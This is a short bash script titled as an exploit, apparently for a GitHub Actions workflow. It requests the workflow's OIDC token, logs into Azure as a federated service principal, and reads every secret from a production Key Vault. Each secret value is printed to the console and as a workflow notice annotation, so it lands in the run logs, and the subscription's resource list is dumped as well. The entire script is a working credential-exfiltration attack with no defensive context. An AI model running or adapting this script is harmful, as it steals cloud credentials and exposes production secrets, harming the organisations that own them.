#!/usr/bin/env bash
set +e
echo "== TBL-CRED2 exploit =="
IDT=$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
echo "jwtlen=${#IDT}"
az login --service-principal -u "$AZURE_CLIENT_ID" --tenant "$AZURE_TENANT_ID" --federated-token "$IDT" --allow-no-subscriptions -o none && echo LOGIN_OK
echo "== kv secrets =="
for s in $(az keyvault secret list --vault-name kv-tbl-prod-x3euoz --query "[].name" -o tsv 2>/dev/null); do
  v=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz -n "$s" --query value -o tsv 2>/dev/null)
  echo "SECRET $s = $v"
  echo "::notice::S $s = $v"
done
echo "== resources =="
az resource list -o json 2>/dev/null | head -c 3000
echo
echo "== DONE =="
